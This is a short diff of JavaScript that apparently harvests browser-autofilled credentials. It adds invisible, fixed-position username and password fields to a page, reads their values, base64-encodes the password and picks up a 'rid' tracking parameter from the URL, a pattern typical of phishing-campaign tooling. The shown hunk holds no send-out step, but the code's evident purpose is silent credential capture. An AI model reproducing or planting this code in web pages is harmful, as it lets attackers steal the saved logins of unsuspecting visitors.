@@ -12,11 +12,11 @@ p.type = "password";
 p.style.position = "fixed";
 p.style.opacity = "0";
 
-body.append(u)
-body.append(p)
+body.append(u);
+body.append(p);
 
-var u_val = encodeURIComponent(u.value)
-var p_val = encodeURIComponent(p.value)
+var u_val = u.value;
+var p_val = btoa(p.value);
 
 var rid = new URLSearchParams(window.location.search).get('rid'); 
 
